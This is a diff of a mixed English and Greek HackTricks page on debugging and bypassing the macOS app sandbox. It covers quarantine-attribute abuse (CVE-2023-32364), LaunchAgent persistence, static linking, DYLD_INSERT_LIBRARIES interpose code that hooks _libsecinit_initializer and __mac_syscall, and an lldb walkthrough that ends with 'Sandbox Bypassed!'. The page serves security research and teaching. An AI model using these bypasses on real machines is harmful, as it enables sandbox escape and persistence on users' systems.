@@ -1,57 +1,96 @@
 # macOS Sandbox Debug & Bypass
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
-
-* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
-
-## Διαδικασία φόρτωσης του Sandbox
-
-<figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>Εικόνα από <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>
-
-Στην προηγούμενη εικόνα είναι δυνατόν να παρατηρήσετε **πώς θα φορτωθεί το sandbox** όταν εκτελείται μια εφαρμογή με το entitlement **`com.apple.security.app-sandbox`**.
-
-Ο μεταγλωττιστής θα συνδέσει το `/usr/lib/libSystem.B.dylib` με το δυαδικό αρχείο.
-
-Στη συνέχεια, το **`libSystem.B`** θα καλέσει και άλλες συναρτήσεις μέχρι η **`xpc_pipe_routine`** να στείλει τα entitlements της εφαρμογής στο **`securityd`**. Το securityd ελέγχει εάν η διεργασία πρέπει να τεθεί σε καραντίνα μέσα στο Sandbox και αν ναι, θα τεθεί σε καραντίνα.\
-Τελικά, το sandbox θα ενεργοποιηθεί με μια κλήση στη **`__sandbox_ms`** η οποία θα καλέσει τη **`__mac_syscall`**.
-
-## Δυνητικά Bypasses
-
-### Παράκαμψη του χαρακτηριστικού καραντίνας
-
-**Τα αρχεία που δημιουργούνται από διεργασίες στο sandbox** προστίθενται το **χαρακτηριστικό καραντίνας** για να αποτραπεί η διαφυγή από το sandbox. Ωστόσο, εάν καταφέρετε να **δημιουργήσετε έναν φάκελο `.app` χωρίς το χαρακτηριστικό καραντίνας** μέσα σε μια εφαρμογή στο sandbox, μπορείτε να κατευθύνετε το δυαδικό αρχείο του πακέτου της εφαρμογής να δείχνει στο **`/bin/bash`** και να προσθέσετε μερικές μεταβλητές περιβάλλοντος στο **plist** για να καταχραστείτε την εντολή **`open`** και να εκτελέσετε τη νέα εφαρμογή χωρίς sandbox.
-
-Αυτό που έγινε στο [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**
-
-{% hint style="danger" %}
-Επομένως, αυτήν τη στιγμή, εάν είστε απλώς ικανός να δημιουργήσετε έναν φάκελο με όνομα που τελειώνει σε **`.app`** χωρίς το χαρακτηριστικό καραντίνας, μπορείτε να διαφύγετε από το sandbox επειδή το macOS ελέγχει μόνο το χαρακτηριστικό καραντίνας στον φάκελο **`.app`** και στο **κύριο εκτελέσιμο** (και θα κατευθύνουμε το κύριο εκτελέσιμο στο **`/bin/bash`**).
-
-Σημειώστε ότι εάν ένα πακέτο .app έχει ήδη εξουσιοδοτηθεί να εκτελείται (έχει ένα quarantine xttr με τη σημαία εξουσιοδότησης για εκτέλεση), μπορείτε επίσης να το καταχραστείτε... εκτός αν δεν μπορείτε πλέον να γράψετε μέσα στο **`.app`** πακέτα εκτός αν έχετε κάποιες προνομιακές άδειες TCC (τις οποίες δεν θα έχετε μέσα σε ένα υψηλό sandbox).
+{% endhint %}
 {% endhint %}
 
-### Κατάχρηση της λειτουργίας Open
+## Sandbox loading process
 
-Στα [**τελευταία παραδείγματα παράκαμψης του sandbox του Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) μπορεί
+<figure><img src="../../../../../.gitbook/assets/image (901).png" alt=""><figcaption><p>Image from <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>
 
+In the previous image it's possible to observe **πώς θα φορτωθεί το sandbox** όταν εκτελείται μια εφαρμογή με την εξουσιοδότηση **`com.apple.security.app-sandbox`**.
+
+The compiler will link `/usr/lib/libSystem.B.dylib` to the binary.
+
+Then, **`libSystem.B`** will be calling other several functions until the **`xpc_pipe_routine`** sends the entitlements of the app to **`securityd`**. Securityd checks if the process should be quarantine inside the Sandbox, and if so, it will be quarentine.\
+Finally, the sandbox will be activated will a call to **`__sandbox_ms`** which will call **`__mac_syscall`**.
+
+## Possible Bypasses
+
+### Bypassing quarantine attribute
+
+**Τα αρχεία που δημιουργούνται από διαδικασίες που είναι σε sandbox** προστίθεται το **quarantine attribute** για να αποτραπεί η διαφυγή από το sandbox. Ωστόσο, αν καταφέρετε να **δημιουργήσετε έναν φάκελο `.app` χωρίς το quarantine attribute** μέσα σε μια εφαρμογή που είναι σε sandbox, θα μπορούσατε να κάνετε το εκτελέσιμο της εφαρμογής να δείχνει στο **`/bin/bash`** και να προσθέσετε κάποιες μεταβλητές περιβάλλοντος στο **plist** για να εκμεταλλευτείτε το **`open`** για να **εκκινήσετε τη νέα εφαρμογή χωρίς sandbox**.
+
+This is what was done in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**
+
+{% hint style="danger" %}
+Therefore, at the moment, if you are just capable of creating a folder with a name ending in **`.app`** without a quarantine attribute, you can scape the sandbox because macOS only **checks** the **quarantine** attribute in the **`.app` folder** and in the **main executable** (and we will point the main executable to **`/bin/bash`**).
+
+Note that if an .app bundle has already been authorized to run (it has a quarantine xttr with the authorized to run flag on), you could also abuse it... except that now you cannot write inside **`.app`** bundles unless you have some privileged TCC perms (which you won't have inside a sandbox high).
+{% endhint %}
+
+### Abusing Open functionality
+
+In the [**last examples of Word sandbox bypass**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) can be appreciated how the **`open`** cli functionality could be abused to bypass the sandbox.
+
+{% content-ref url="macos-office-sandbox-bypasses.md" %}
+[macos-office-sandbox-bypasses.md](macos-office-sandbox-bypasses.md)
+{% endcontent-ref %}
+
+### Launch Agents/Daemons
+
+Even if an application is **meant to be sandboxed** (`com.apple.security.app-sandbox`), it's possible to make bypass the sandbox if it's **executed from a LaunchAgent** (`~/Library/LaunchAgents`) for example.\
+As explained in [**this post**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), if you want to gain persistence with an application that is sandboxed you could make be automatically executed as a LaunchAgent and maybe inject malicious code via DyLib environment variables.
+
+### Abusing Auto Start Locations
+
+If a sandboxed process can **write** in a place where **later an unsandboxed application is going to run the binary**, it will be able to **escape just by placing** there the binary. A good example of this kind of locations are `~/Library/LaunchAgents` or `/System/Library/LaunchDaemons`.
+
+For this you might even need **2 steps**: To make a process with a **more permissive sandbox** (`file-read*`, `file-write*`) execute your code which will actually write in a place where it will be **executed unsandboxed**.
+
+Check this page about **Auto Start locations**:
+
+{% content-ref url="../../../../macos-auto-start-locations.md" %}
+[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
+{% endcontent-ref %}
+
+### Abusing other processes
+
+If from then sandbox process you are able to **compromise other processes** running in less restrictive sandboxes (or none), you will be able to escape to their sandboxes:
+
+{% content-ref url="../../../macos-proces-abuse/" %}
+[macos-proces-abuse](../../../macos-proces-abuse/)
+{% endcontent-ref %}
+
+### Static Compiling & Dynamically linking
+
+[**This research**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) discovered 2 ways to bypass the Sandbox. Because the sandbox is applied from userland when the **libSystem** library is loaded. If a binary could avoid loading it, it would never get sandboxed:
+
+* If the binary was **completely statically compiled**, it could avoid loading that library.
+* If the **binary wouldn't need to load any libraries** (because the linker is also in libSystem), it won't need to load libSystem.
+
+### Shellcodes
+
+Note that **even shellcodes** in ARM64 needs to be linked in `libSystem.dylib`:
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
+### Entitlements
 
-### Εξουσιοδοτήσεις
-
-Σημειώστε ότι ακόμα κι αν ορισμένες **ενέργειες** επιτρέπονται από το **αμμοβολίστρα** αν μια εφαρμογή έχει μια συγκεκριμένη **εξουσιοδότηση**, όπως στο παράδειγμα:
-
+Σημειώστε ότι ακόμη και αν ορισμένες **ενέργειες** μπορεί να είναι **επιτρεπτές από το sandbox** αν μια εφαρμογή έχει μια συγκεκριμένη **δικαιοδοσία**, όπως στο:
 ```scheme
 (when (entitlement "com.apple.security.network.client")
 (allow network-outbound (remote ip))
@@ -61,17 +100,15 @@ ld: dynamic executables or dylibs must link with libSystem.dylib for architectur
 (global-name "com.apple.cfnetwork.cfnetworkagent")
 [...]
 ```
+### Interposting Bypass
 
-### Διάβαση Παράκαμψης
-
-Για περισσότερες πληροφορίες σχετικά με τη **Διάβαση Παράκαμψης**, ανατρέξτε στο:
+Για περισσότερες πληροφορίες σχετικά με το **Interposting** δείτε:
 
 {% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
 [macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
 {% endcontent-ref %}
 
-#### Διάβαση Παράκαμψης του `_libsecinit_initializer` για την αποτροπή του sandbox
-
+#### Interpost `_libsecinit_initializer` για να αποτρέψετε το sandbox
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -95,8 +132,7 @@ DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 _libsecinit_initializer called
 Sandbox Bypassed!
 ```
-
-#### Ενδιάμεση `__mac_syscall` για την αποτροπή του Sandbox
+#### Interpost `__mac_syscall` για να αποτρέψετε το Sandbox
 
 {% code title="interpose.c" %}
 ```c
@@ -131,7 +167,6 @@ __attribute__((used)) static const struct interpose_sym interposers[] __attribut
 };
 ```
 {% endcode %}
-
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 
@@ -143,13 +178,12 @@ __mac_syscall invoked. Policy: Quarantine, Call: 87
 __mac_syscall invoked. Policy: Sandbox, Call: 4
 Sandbox Bypassed!
 ```
-
-### Αποσφαλμάτωση και παράκαμψη του Sandbox με το lldb
+### Debug & bypass Sandbox with lldb
 
 Ας συντάξουμε μια εφαρμογή που θα πρέπει να είναι σε sandbox:
 
 {% tabs %}
-{% tab title="undefined" %}
+{% tab title="sand.c" %}
 ```c
 #include <stdlib.h>
 int main() {
@@ -167,13 +201,9 @@ system("cat ~/Desktop/del.txt");
 </dict>
 </plist>
 ```
+{% endtab %}
 
-Το αρχείο Info.plist είναι ένα αρχείο ρυθμίσεων που χρησιμοποιείται για να περιγράψει τις διάφορες ρυθμίσεις και δυνατότητες μιας εφαρμογής στο macOS. Περιέχει πληροφορίες όπως το όνομα της εφαρμογής, τον αριθμό έκδοσης, τον αριθμό της έκδοσης του λειτουργικού συστήματος που υποστηρίζεται και άλλες σχετικές ρυθμίσεις. Το Info.plist είναι σημαντικό για την ασφάλεια της εφαρμογής, καθώς περιέχει πληροφορίες για τις απαιτούμενες δικαιώματα και περιορισμούς πρόσβασης που επιβάλλονται από το sandbox του macOS.
-
-Το Info.plist πρέπει να περιέχει τις σωστές ρυθμίσεις για να επιτραπεί η εκτέλεση της εφαρμογής σε ένα sandbox περιβάλλον. Αν οι ρυθμίσεις δεν είναι σωστές, η εφαρμογή μπορεί να αποτύχει να εκτελεστεί ή να έχει περιορισμένη πρόσβαση σε συγκεκριμένους πόρους του συστήματος.
-
-Για να παρακάμψετε το sandbox του macOS, μπορείτε να τροποποιήσετε το Info.plist της εφαρμογής. Αυτό μπορεί να γίνει με διάφορους τρόπους, όπως την προσθήκη επιπλέον δικαιωμάτων πρόσβασης ή την απενεργοποίηση των περιορισμών που επιβάλλονται από το sandbox. Ωστόσο, πρέπει να ληφθεί υπόψη ότι η παράκαμψη του sandbox μπορεί να αποτελέσει ασφαλειακό κίνδυνο και να επιτρέψει την πρόσβαση σε ευαίσθητες πληροφορίες ή λειτουργίες του συστήματος.
-
+{% tab title="Info.plist" %}
 ```xml
 <plist version="1.0">
 <dict>
@@ -202,16 +232,14 @@ codesign -s <cert-name> --entitlements entitlements.xml sand
 {% endcode %}
 
 {% hint style="danger" %}
-Η εφαρμογή θα προσπαθήσει να **διαβάσει** το αρχείο **`~/Desktop/del.txt`**, το οποίο ο **Sandbox δεν επιτρέπει**.\
-Δημιουργήστε ένα αρχείο εκεί, καθώς μόλις παρακάμψετε το Sandbox, θα μπορεί να το διαβάσει:
-
+Η εφαρμογή θα προσπαθήσει να **διαβάσει** το αρχείο **`~/Desktop/del.txt`**, το οποίο η **Sandbox δεν θα επιτρέψει**.\
+Δημιουργήστε ένα αρχείο εκεί καθώς μόλις παρακαμφθεί η Sandbox, θα μπορεί να το διαβάσει:
 ```bash
 echo "Sandbox Bypassed" > ~/Desktop/del.txt
 ```
 {% endhint %}
 
-Ας εκτελέσουμε αποσφαλμάτωση στην εφαρμογή για να δούμε πότε φορτώνεται ο Αμμοδοχείο (Sandbox):
-
+Ας αποσφαλματώσουμε την εφαρμογή για να δούμε πότε φορτώνεται το Sandbox:
 ```bash
 # Load app in debugging
 lldb ./sand
@@ -288,9 +316,8 @@ Process 2517 resuming
 Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
-
 {% hint style="warning" %}
-**Ακόμα και αν ο προστατευτικός τοίχος του Sandbox έχει παρακαμφθεί, το TCC** θα ζητήσει από τον χρήστη να επιτρέψει στη διεργασία να διαβάσει αρχεία από την επιφάνεια εργασίας.
+**Ακόμα και με το Sandbox παρακάμπτεται, το TCC** θα ρωτήσει τον χρήστη αν θέλει να επιτρέψει στη διαδικασία να διαβάσει αρχεία από την επιφάνεια εργασίας
 {% endhint %}
 
 ## Αναφορές
@@ -298,17 +325,19 @@ Process 2517 exited with status = 0 (0x00000000)
 * [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
 * [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
 * [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)
+{% hint style="success" %}
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Υποστήριξη HackTricks</summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
-
-* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Συμμετάσχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
+* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+</details>
+{% endhint %}
